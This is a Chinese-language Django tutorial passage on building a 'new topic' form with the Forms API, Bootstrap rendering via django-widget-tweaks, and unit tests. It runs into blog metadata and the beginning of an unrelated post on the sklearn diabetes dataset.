我们依然还没有实现到达这个新页面的方法，但是如果我们将 URL 改为 http://127.0.0.1:8000/boards/2/new/，它会把我们带到 Python Board 的页面： 注意：如果你没有跟着上一节课程一步步地做，你的结果和我的可能有些不一样。在我这个例子中，我的数据库有 3 个 Board 实例，分别是 Django = 1, Python = 2, 和 Random = 3。这些数字是数据库中的 ID，用来找到正确的资源。 我们可以增加一些测试了： boards/tests.py 123456789101112131415161718192021222324252627282930313233343536from django.core.urlresolvers import reversefrom django.urls import resolvefrom django.test import TestCasefrom .views import home, board_topics, new_topicfrom .models import Boardclass HomeTests(TestCase): # ...class BoardTopicsTests(TestCase): # ...class NewTopicTests(TestCase): def setUp(self): Board.objects.create(name='Django', description='Django board.') def test_new_topic_view_success_status_code(self): url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) response = self.client.get(url) self.assertEquals(response.status_code, 200) def test_new_topic_view_not_found_status_code(self): url = reverse('new_topic', kwargs=&#123;'pk': 99&#125;) response = self.client.get(url) self.assertEquals(response.status_code, 404) def test_new_topic_url_resolves_new_topic_view(self): view = resolve('/boards/1/new/') self.assertEquals(view.func, new_topic) def test_new_topic_view_contains_link_back_to_board_topics_view(self): new_topic_url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) board_topics_url = reverse('board_topics', kwargs=&#123;'pk': 1&#125;) response = self.client.get(new_topic_url) self.assertContains(response, 'href=\"&#123;0&#125;\"'.format(board_topics_url)) 关于我们的测试中新的 NewTopicTests 类的快速总结： setUp：创建一个测试中使用的 *Board *实例 test_new_topic_view_success_status_code：检查发给 view 的请求是否成功 test_new_topic_view_not_found_status_code：检查当 Board 不存在时 view 是否会抛出一个 404 的错误 test_new_topic_url_resolves_new_topic_view：检查是否正在使用正确的 view test_new_topic_view_contains_link_back_to_board_topics_view：确保导航能回到 topics 的列表 运行测试： python manage.py test 12345678Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)............----------------------------------------------------------------------Ran 11 tests in 0.046sOKDestroying test database for alias &#39;default&#39;... 成功，现在我们可以去开始创建表单了。 templates/new_topic.html 123456789101112131415161718192021222324&#123;% extends 'base.html' %&#125;&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;New topic&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;form method=\"post\"&gt; &#123;% csrf_token %&#125; &lt;div class=\"form-group\"&gt; &lt;label for=\"id_subject\"&gt;Subject&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" id=\"id_subject\" name=\"subject\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"id_message\"&gt;Message&lt;/label&gt; &lt;textarea class=\"form-control\" id=\"id_message\" name=\"message\" rows=\"5\"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-success\"&gt;Post&lt;/button&gt; &lt;/form&gt;&#123;% endblock %&#125; 这是一个使用 Bootstrap 4 提供的 CSS 类手动创建的 HTML 表单。访问浏览器： 在 &lt;form&gt; 标签中，我们定义了 method 属性。它会告诉浏览器我们想如何与服务器通信。HTTP 规范定义了几种 request methods(请求方法)。但是在大部分情况下，我们只需要使用 GET 和 POST 两种 request(请求)类型。 GET 可能是最常见的请求类型了。它用于从服务器请求数据。每当你点击了一个链接或者直接在浏览器中输入了一个网址时，你就创建一个 GET 请求。 POST 用于当我们想更改服务器上的数据的时候。一般来说，每次我们发送数据给服务器都会导致资源状态的变化，我们应该使用 POST 请求发送数据。 Django 使用 CSRF Token(Cross-Site Request Forgery Token) 保护所有的 POST 请求。这是一个避免外部站点或者应用程序向我们的应用程序提交数据的安全措施。应用程序每次接收一个 POST 时，都会先检查 CSRF Token。如果这个 request 没有 token，或者这个 token是无效的，它就会抛弃提交的数据。 csrf_token 的模板标签： 1&#123;% csrf_token %&#125; 它是与其他表单数据一起提交的隐藏字段： 1&lt;input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"jG2o6aWj65YGaqzCpl0TYTg5jn6SctjzRZ9KmluifVx0IVaxlwh97YarZKs54Y32\"&gt; 另外一件事是，我们需要设置 HTML 输入的 name，name 将被用来在服务器获取数据。 12&lt;input type=\"text\" class=\"form-control\" id=\"id_subject\" name=\"subject\"&gt;&lt;textarea class=\"form-control\" id=\"id_message\" name=\"message\" rows=\"5\"&gt;&lt;/textarea&gt; 下面是示范我们如何检索数据： 12subject = request.POST['subject']message = request.POST['message'] 所以，从 HTML 获取数据并且开始一个新的 topic 视图的简单实现可以这样写： 12345678910111213141516171819202122232425262728from django.contrib.auth.models import Userfrom django.shortcuts import render, redirect, get_object_or_404from .models import Board, Topic, Postdef new_topic(request, pk): board = get_object_or_404(Board, pk=pk) if request.method == 'POST': subject = request.POST['subject'] message = request.POST['message'] user = User.objects.first() # TODO: 临时使用一个账号作为登录用户 topic = Topic.objects.create( subject=subject, board=board, starter=user ) post = Post.objects.create( message=message, topic=topic, created_by=user ) return redirect('board_topics', pk=board.pk) # TODO: redirect to the created topic page return render(request, 'new_topic.html', &#123;'board': board&#125;) 这个视图函数只考虑能接收数据并且保存进数据库的乐观合法的 path，但是还缺少一些部分。我们没有验证数据。用户可以提交空表单或者提交一个大于 255 个字符的 subject。 到目前为止我们都在对 User 字段进行硬编码，因为我们还没有实现身份验证。有一个简单的方法来识别登录的用户。我们会在下一个课程将这一块。此外，我们还没有实现列出 topic 的所有 posts 的视图，实现了它，我们就可以将用户重定向到列出所有主题的列表页面。 点击 Post 按钮提交表单： 看起来成功了。但是我们还没有实现主题的列表页面，所以没有东西可以看。让我们来编辑 templates/topics.html 来实现一个合适的列表： templates/topics.html 1234567891011121314151617181920212223242526272829303132333435&#123;% extends 'base.html' %&#125;&#123;% block title %&#125; &#123;&#123; board.name &#125;&#125; - &#123;&#123; block.super &#125;&#125;&#123;% endblock %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;table class=\"table\"&gt; &lt;thead class=\"thead-inverse\"&gt; &lt;tr&gt; &lt;th&gt;Topic&lt;/th&gt; &lt;th&gt;Starter&lt;/th&gt; &lt;th&gt;Replies&lt;/th&gt; &lt;th&gt;Views&lt;/th&gt; &lt;th&gt;Last Update&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &#123;% for topic in board.topics.all %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; topic.subject &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; topic.starter.username &#125;&#125;&lt;/td&gt; &lt;td&gt;0&lt;/td&gt; &lt;td&gt;0&lt;/td&gt; &lt;td&gt;&#123;&#123; topic.last_updated &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/tbody&gt; &lt;/table&gt;&#123;% endblock %&#125; 访问浏览器： 我们创建的 Topic 显示在这上面了。 这里有两个新概念。 我们首次使用 Board 模型中的 topics 属性。topics 属性由 Django 使用反向关系自动创建。在之前的步骤中，我们创建了一个 Topic 实例： 12345678910def new_topic(request, pk): board = get_object_or_404(Board, pk=pk) # ... topic = Topic.objects.create( subject=subject, board=board, starter=user ) 在 board=board 这行，我们设置了 Topic 模型中的 board 字段，它是 ForeignKey(Board)。因此，我们的 Board 实例就知道了与它关联的 Topic 实例。 之所以我们使用 board.topics.all 而不是 board.topics，是因为 board.topics 是一个 Related Manager,它与 Model Manager 很相似，通常在 board.objects 可得到。所以，要返回给定 board 的所有 topic 我们必须使用 board.topics.all()，要过滤一些数据，我们可以这样用 board.topics.filter(subject__contains=&#39;Hello&#39;)。 另一个需要注意的是，在 Python 代码中，我们必须使用括号：board.topics.all()，因为 all() 是一个方法。在使用 Django 模板语言写代码的时候，在一个 HTML 模板文件里面，我们不使用括号，就只是 board.topics.all。 第二件事是我们在使用 ForeignKey： 1&#123;&#123; topic.starter.username &#125;&#125; 使用一个点加上属性这种写法，我们几乎可以访问 User 模型的所有属性。如果我们想得到用户的 email，我们可以使用 topic.starter.email 我们已经修改了 topics.html 模板，让我们创建一个能让我们转到 new topic* 页面的按钮： templates/topics.html 123456789&#123;% block content %&#125; &lt;div class=\"mb-4\"&gt; &lt;a href=\"&#123;% url 'new_topic' board.pk %&#125;\" class=\"btn btn-primary\"&gt;New topic&lt;/a&gt; &lt;/div&gt; &lt;table class=\"table\"&gt; &lt;!-- code suppressed for brevity --&gt; &lt;/table&gt;&#123;% endblock %&#125; 访问浏览器： 我们可以写一个测试以确保用户可以通过此页面访问到 New Topic 页面： boards/tests.py 123456789101112class BoardTopicsTests(TestCase): # ... def test_board_topics_view_contains_navigation_links(self): board_topics_url = reverse('board_topics', kwargs=&#123;'pk': 1&#125;) homepage_url = reverse('home') new_topic_url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) response = self.client.get(board_topics_url) self.assertContains(response, 'href=\"&#123;0&#125;\"'.format(homepage_url)) self.assertContains(response, 'href=\"&#123;0&#125;\"'.format(new_topic_url)) 我在这里基本上重命名了 test_board_topics_view_contains_link_back_to_homepage 方法并添加了一个额外的 assertContains。这个测试现在负责确保我们的 view 包含所需的导航链接。 测试表单在我们使用 Django 的方式编写之前的表单示例之前, 让我们先为表单处理写一些测试： boards/tests.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950''' new imports below '''from django.contrib.auth.models import Userfrom .views import new_topicfrom .models import Board, Topic, Postclass NewTopicTests(TestCase): def setUp(self): Board.objects.create(name='Django', description='Django board.') User.objects.create_user(username='john', email='john@doe.com', password='123') # &lt;- included this line here # ... def test_csrf(self): url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) response = self.client.get(url) self.assertContains(response, 'csrfmiddlewaretoken') def test_new_topic_valid_post_data(self): url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) data = &#123; 'subject': 'Test title', 'message': 'Lorem ipsum dolor sit amet' &#125; response = self.client.post(url, data) self.assertTrue(Topic.objects.exists()) self.assertTrue(Post.objects.exists()) def test_new_topic_invalid_post_data(self): ''' Invalid post data should not redirect The expected behavior is to show the form again with validation errors ''' url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) response = self.client.post(url, &#123;&#125;) self.assertEquals(response.status_code, 200) def test_new_topic_invalid_post_data_empty_fields(self): ''' Invalid post data should not redirect The expected behavior is to show the form again with validation errors ''' url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) data = &#123; 'subject': '', 'message': '' &#125; response = self.client.post(url, data) self.assertEquals(response.status_code, 200) self.assertFalse(Topic.objects.exists()) self.assertFalse(Post.objects.exists()) 首先， test.py 文件变的越来越大。我们会尽快改进它，将测试分为几个文件。但现在，让我们先保持这个状态。 setUp：包含 User.objects.create_user 以创建用于测试的 User 实例。 test_csrf：由于 CSRF Token 是处理 Post 请求的基本部分，我们需要保证我们的 HTML 包含 token。 test_new_topic_valid_post_data：发送有效的数据并检查视图函数是否创建了 Topic 和 Post 实例。 test_new_topic_invalid_post_data：发送一个空字典来检查应用的行为。 test_new_topic_invalid_post_data_empty_fields：类似于上一个测试，但是这次我们发送一些数据。预期应用程序会验证并且拒绝空的 subject 和 message。 运行这些测试： python manage.py test 123456789101112131415161718192021222324Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced).........EF.....&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ERROR: test_new_topic_invalid_post_data (boards.tests.NewTopicTests)----------------------------------------------------------------------Traceback (most recent call last):...django.utils.datastructures.MultiValueDictKeyError: &quot;&#39;subject&#39;&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;FAIL: test_new_topic_invalid_post_data_empty_fields (boards.tests.NewTopicTests)----------------------------------------------------------------------Traceback (most recent call last): File &quot;&#x2F;home&#x2F;humen&#x2F;Development&#x2F;myproject&#x2F;myproject&#x2F;boards&#x2F;tests.py&quot;, line 119, in test_new_topic_invalid_post_data_empty_fields self.assertEquals(response.status_code, 200)AssertionError: 302 !&#x3D; 200----------------------------------------------------------------------Ran 15 tests in 0.328sFAILED (failures&#x3D;1, errors&#x3D;1)Destroying test database for alias &#39;default&#39;... 有一个失败的测试和一个错误。两个都与验证用户的输入有关。不要试图用当前的实现来修复它，让我们通过使用 Django Forms API 来通过这些测试 创建表单正确的姿势自从我们开始使用 Forms，我们已经走了很长一段路。终于，是时候使用 Forms API 了。 Forms API 可在模块 django.forms 中得到。Django 使用两种类型的 form：forms.Form 和 forms.ModelForm。Form类是通用的表单实现。我们可以使用它来处理与应用程序 model 没有直接关联的数据。ModelForm 是 Form 的子类，它与 model 类相关联。 在 boards 文件夹下创建一个新的文件 forms.py： boards/forms.py 123456789from django import formsfrom .models import Topicclass NewTopicForm(forms.ModelForm): message = forms.CharField(widget=forms.Textarea(), max_length=4000) class Meta: model = Topic fields = ['subject', 'message'] 这是我们的第一个 form。它是一个与 Topic model 相关联的 ModelForm。Meta 类里面 fields 列表中的 subject 引用 Topic 类中的 subject field(字段)。现在注意到我们定义了一个叫做 message 的额外字段。它用来引用 Post 中我们想要保存的 message。 现在我们需要重写我们的 views.py： boards/views.py 123456789101112131415161718192021222324from django.contrib.auth.models import Userfrom django.shortcuts import render, redirect, get_object_or_404from .forms import NewTopicFormfrom .models import Board, Topic, Postdef new_topic(request, pk): board = get_object_or_404(Board, pk=pk) user = User.objects.first() # TODO: get the currently logged in user if request.method == 'POST': form = NewTopicForm(request.POST) if form.is_valid(): topic = form.save(commit=False) topic.board = board topic.starter = user topic.save() post = Post.objects.create( message=form.cleaned_data.get('message'), topic=topic, created_by=user ) return redirect('board_topics', pk=board.pk) # TODO: redirect to the created topic page else: form = NewTopicForm() return render(request, 'new_topic.html', &#123;'board': board, 'form': form&#125;) 这是我们在 view(视图) 中处理 form(表单) 的方式。让我们去掉一些多余的部分，只看表单处理的核心部分： 12345678if request.method == 'POST': form = NewTopicForm(request.POST) if form.is_valid(): topic = form.save() return redirect('board_topics', pk=board.pk)else: form = NewTopicForm()return render(request, 'new_topic.html', &#123;'form': form&#125;) 首先我们判断请求是 POST 还是 GET。如果请求是POST，这意味着用户向服务器提交了一些数据。所以我们实例化一个将 POST 数据传递给 form 的 form 实例：form = NewTopicForm(request.POST)。 然后，我们让 Django 验证数据，检查 form 是否有效，我们能否将其存入数据库：if form.is_valid():。如果表单有效，我们使用 form.save() 将数据存入数据库。save() 方法返回一个存入数据库的 Model实例。所以，因为这是一个 Topic form, 所以它会返回 topic = form.save() 创建的 Topic。然后，通用的路径是把用户重定向到其他地方，以避免用户通过按 F5 重新提交表单，并且保证应用程序的流程走向。 现在，如果数据是无效的，Django 会给 form 添加错误列表。然后，视图函数不会做任何处理并且返回最后一句：return render(request, &#39;new_topic.html&#39;, {&#39;form&#39;: form})。这意味着我们需要更新 new_topic.html 以显示错误。 如果请求是 GET，我们只需要使用 form = NewTopicForm() 初始化一个新的空表单。 让我们运行测试并观察情况： python manage.py test 12345678Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)................----------------------------------------------------------------------Ran 15 tests in 0.337sOKDestroying test database for alias &#39;default&#39;... 我们甚至修复了最后两个测试。 Django Forms API 不仅仅是处理和验证数据。它还为我们生成 HTML。 templates/new_topic.html 1234567891011121314151617&#123;% extends 'base.html' %&#125;&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;New topic&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;form method=\"post\"&gt; &#123;% csrf_token %&#125; &#123;&#123; form.as_p &#125;&#125; &lt;button type=\"submit\" class=\"btn btn-success\"&gt;Post&lt;/button&gt; &lt;/form&gt;&#123;% endblock %&#125; 这个 form 有三个渲染选项：form.as_table，form.as_ul 和 form.as_p。这是一个快速的渲染表单所有字段的方法。顾名思义，as_table 使用table 标签来格式化输入，as_ul 使用 li 标签。 访问浏览器，看效果： 我们以前的 form 看起来更好，是吧？我们将立即修复它。 它看起来很破，但是相信我；它背后有很多东西。它非常强大。比如，如果我们的表单有 50 个字段，我们可以通过键入 {{ form.as_p }}来显示所有字段。 此外，使用 Forms API，Django 会验证数据并且向每个字段添加错误消息。让我们尝试提交一个空的表单： 注意：如果你提交表单时看到类似这样的东西：Please fill out this field这不是 Django 导致的，而是你的浏览器进行预验证。要禁用它可以在你的表单标签中添加 novalidate 属性：你可以不修改它，不会有问题。这只是因为我们的表单现在非常简单，而且我们没有太多的数据验证可以看到。另外一件需要注意的事情是：没有 “只客户端验证” 这样的事情。JavaScript 验证或者浏览器验证仅用于可用性目的。同时也减少了对服务器的请求数量。数据验证应该始终在服务器端完成，这样我们可以完全掌控数据。 它还可以处理在 Form类或者 Model 类中定义的帮助文本。 boards/forms.py 12345678910111213from django import formsfrom .models import Topicclass NewTopicForm(forms.ModelForm): message = forms.CharField( widget=forms.Textarea(), max_length=4000, help_text='The max length of the text is 4000.' ) class Meta: model = Topic fields = ['subject', 'message'] 访问浏览器： 我们也可以为表单字段设置额外的属性： boards/forms.py 123456789101112131415from django import formsfrom .models import Topicclass NewTopicForm(forms.ModelForm): message = forms.CharField( widget=forms.Textarea( attrs=&#123;'rows': 5, 'placeholder': 'What is on your mind?'&#125; ), max_length=4000, help_text='The max length of the text is 4000.' ) class Meta: model = Topic fields = ['subject', 'message'] 访问浏览器： 用BootStrap 表单渲染当使用 Bootstrap 或者其他的前端库时，我比较喜欢使用一个叫做 django-widget-tweaks 的 Django 库。它可以让我们更好地控制渲染的处理，在保证默认值的情况下，只需在上面添加额外的自定义设置。 开始安装它： pip install django-widget-tweaks 添加到 INSTALLED_APPS： myproject/settings.py 123456789101112INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'widget_tweaks', 'boards',] 现在可以使用它了： templates/new_topic.html 123456789101112131415161718192021222324252627282930313233&#123;% extends 'base.html' %&#125;&#123;% load widget_tweaks %&#125;&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;New topic&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;form method=\"post\" novalidate&gt; &#123;% csrf_token %&#125; &#123;% for field in form %&#125; &lt;div class=\"form-group\"&gt; &#123;&#123; field.label_tag &#125;&#125; &#123;% render_field field class=\"form-control\" %&#125; &#123;% if field.help_text %&#125; &lt;small class=\"form-text text-muted\"&gt; &#123;&#123; field.help_text &#125;&#125; &lt;/small&gt; &#123;% endif %&#125; &lt;/div&gt; &#123;% endfor %&#125; &lt;button type=\"submit\" class=\"btn btn-success\"&gt;Post&lt;/button&gt; &lt;/form&gt;&#123;% endblock %&#125; 访问浏览器： 这就是我们使用的 django-widget-tweaks 的效果。首先，我们使用{% load widget_tweaks %} 模板标签将其加载到模板。然后这样使用它： 1&#123;% render_field field class=\"form-control\" %&#125; render_field 不属于 Django；它存在于我们安装的包里面。要使用它，我们需要传递一个表单域实例作为第一个参数，然后我们可以添加任意的 HTML 属性去补充它。这很有用因为我们可以根据特定的条件指定类。 一些 render_field 模板标签的例子： 1234&#123;% render_field form.subject class=\"form-control\" %&#125;&#123;% render_field form.message class=\"form-control\" placeholder=form.message.label %&#125;&#123;% render_field field class=\"form-control\" placeholder=\"Write a message!\" %&#125;&#123;% render_field field style=\"font-size: 20px\" %&#125; 现在要实现 Bootstrap 4 验证标签，我们可以修改 new_topic.html 模板。 templates/new_topic.html 12345678910111213141516171819202122232425262728293031323334&lt;form method=\"post\" novalidate&gt; &#123;% csrf_token %&#125; &#123;% for field in form %&#125; &lt;div class=\"form-group\"&gt; &#123;&#123; field.label_tag &#125;&#125; &#123;% if form.is_bound %&#125; &#123;% if field.errors %&#125; &#123;% render_field field class=\"form-control is-invalid\" %&#125; &#123;% for error in field.errors %&#125; &lt;div class=\"invalid-feedback\"&gt; &#123;&#123; error &#125;&#125; &lt;/div&gt; &#123;% endfor %&#125; &#123;% else %&#125; &#123;% render_field field class=\"form-control is-valid\" %&#125; &#123;% endif %&#125; &#123;% else %&#125; &#123;% render_field field class=\"form-control\" %&#125; &#123;% endif %&#125; &#123;% if field.help_text %&#125; &lt;small class=\"form-text text-muted\"&gt; &#123;&#123; field.help_text &#125;&#125; &lt;/small&gt; &#123;% endif %&#125; &lt;/div&gt; &#123;% endfor %&#125; &lt;button type=\"submit\" class=\"btn btn-success\"&gt;Post&lt;/button&gt;&lt;/form&gt; 访问浏览器： 所以，我们有三种不同的渲染状态： Initial state：表单没有数据(不受约束) Invalid：我们添加了 .is-invalid 这个 CSS class 并将错误消息添加到具有 .invalid-feedback class 的元素中 Valid：我们添加了 .is-valid 的 CSS class，以绿色绘制表单域，并向用户反馈它是否可行。 复用表单模板模板看起来有点复杂，是吧？有个好消息是我们可以在项目中重复使用它。 在 templates 文件夹中，创建一个新的文件夹命名为 includes： myproject/ |-- myproject/ | |-- boards/ | |-- myproject/ | |-- templates/ | | |-- includes/ &lt;-- here! | | |-- base.html | | |-- home.html | | |-- new_topic.html | | +-- topics.html | +-- manage.py +-- venv/ 在 includes 文件夹中，创建一个 form.html： templates/includes/form.html 12345678910111213141516171819202122232425262728&#123;% load widget_tweaks %&#125;&#123;% for field in form %&#125; &lt;div class=\"form-group\"&gt; &#123;&#123; field.label_tag &#125;&#125; &#123;% if form.is_bound %&#125; &#123;% if field.errors %&#125; &#123;% render_field field class=\"form-control is-invalid\" %&#125; &#123;% for error in field.errors %&#125; &lt;div class=\"invalid-feedback\"&gt; &#123;&#123; error &#125;&#125; &lt;/div&gt; &#123;% endfor %&#125; &#123;% else %&#125; &#123;% render_field field class=\"form-control is-valid\" %&#125; &#123;% endif %&#125; &#123;% else %&#125; &#123;% render_field field class=\"form-control\" %&#125; &#123;% endif %&#125; &#123;% if field.help_text %&#125; &lt;small class=\"form-text text-muted\"&gt; &#123;&#123; field.help_text &#125;&#125; &lt;/small&gt; &#123;% endif %&#125; &lt;/div&gt;&#123;% endfor %&#125; 现在来修改我们的 new_topic.html 模板： templates/new_topic.html 1234567891011121314151617&#123;% extends 'base.html' %&#125;&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;New topic&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;form method=\"post\" novalidate&gt; &#123;% csrf_token %&#125; &#123;% include 'includes/form.html' %&#125; &lt;button type=\"submit\" class=\"btn btn-success\"&gt;Post&lt;/button&gt; &lt;/form&gt;&#123;% endblock %&#125; 顾名思义，{% include %} 用来在其他的模板中包含 HTML 模板。这是在项目中重用 HTML 组件的常用方法。 在下一个我们实现的表单，我们可以简单地使用 {% include 'includes/form.html' %} 去渲染它。 Adding More Tests现在我们在使用 Django 表单；我们可以添加更多的测试以确保它能运行顺利 boards/tests.py 12345678910111213141516171819202122# ... other importsfrom .forms import NewTopicFormclass NewTopicTests(TestCase): # ... other tests def test_contains_form(self): # &lt;- new test url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) response = self.client.get(url) form = response.context.get('form') self.assertIsInstance(form, NewTopicForm) def test_new_topic_invalid_post_data(self): # &lt;- updated this one ''' Invalid post data should not redirect The expected behavior is to show the form again with validation errors ''' url = reverse('new_topic', kwargs=&#123;'pk': 1&#125;) response = self.client.post(url, &#123;&#125;) form = response.context.get('form') self.assertEquals(response.status_code, 200) self.assertTrue(form.errors) 这是我们第一次使用 assertIsInstance 方法。基本上我们的处理是抓取上下文的表单实例，检查它是否是一个NewTopicForm。在最后的测试中，我添加了 self.assertTrue(form.errors) 以确保数据无效的时候表单会显示错误。 总结在这个课程，我们学习了 URLs, 可重用模板和表单。像往常一样，我们也实现了几个测试用例。这能使我们开发中更自信。 我们的测试文件变的越来越大，所以在下一节中，我们重构它以提高它的可维护性，从而维持我们代码的增加。 我们也达到了我们需要与登录的用户进行交互的目的。在下一节，我们学习了关于认证的一切知识和怎么去保护我们的视图和资源。 参考链接：https://mp.weixin.qq.com/s/il8i-BLqamNu53i_JjTs5w","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web框架","slug":"python/Web框架","permalink":"https://fishni.github.io/categories/python/Web%E6%A1%86%E6%9E%B6/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"Web框架","slug":"Web框架","permalink":"https://fishni.github.io/tags/Web%E6%A1%86%E6%9E%B6/"}]},{"title":"【数据集分析】糖尿病数据集分析","slug":"糖尿病数据集分析","date":"2020-04-25T16:00:00.000Z","updated":"2020-04-26T10:35:51.343Z","comments":true,"path":"2020/04/26/糖尿病数据集分析/","link":"","permalink":"https://fishni.github.io/2020/04/26/%E7%B3%96%E5%B0%BF%E7%97%85%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/","excerpt":"本文主要是：通过学习python处理糖尿病数据集的方法，了解数据集特征，已经线性回归在预测糖尿病中的应用…","text":"本文主要是：通过学习python处理糖尿病数据集的方法，了解数据集特征，已经线性回归在预测糖尿病中的应用… 实验目的 了解糖尿病数据集的基本特征 掌握线性回归在预测糖尿病中的应用 实验内容 糖尿病数据集（diabetes dataset）基础实验 利用糖尿病数据集预测糖尿病实验 实验步骤实验一：糖尿病数据集基础实验步骤一：加载数据集糖尿病（diabetes）数据集，包含在sklearn库的datasets 模块中,调用 load_diabetes 函数来加载数据 123from sklearn import datasets# 加载数据集diabetes = datasets.load_diabetes() 步骤二：读取糖尿病数据集的描述信息12# dir()查看diabetes的属性dir(diabetes) [&apos;DESCR&apos;, &apos;data&apos;, &apos;data_filename&apos;, &apos;feature_names&apos;, &apos;target&apos;, &apos;target_filename&apos;]12# diabetes.keys()显示diabetes对象的键，键对应于一定的值diabetes.keys() dict_keys([&apos;data&apos;, &apos;target&apos;, &apos;DESCR&apos;, &apos;feature_names&apos;, &apos;data_filename&apos;, &apos;target_filename&apos;])12# 读取描述信息print(diabetes.DESCR) .. _diabetes_dataset: Diabetes dataset ---------------- Ten baseline variables, age, sex, body mass index, average blood pressure, and six blood serum measurements were obtained for each of n = 442 diabetes patients, as well as the response of interest, a quantitative measure of disease progression one year after baseline. **Data Set Characteristics:** :Number of Instances: 442 :Number of Attributes: First 10 columns are numeric predictive values :Target: Column 11 is a quantitative measure of disease progression one year after baseline :Attribute Information: - Age - Sex - Body mass index - Average blood pressure - S1 - S2 - S3 - S4 - S5 - S6 Note: 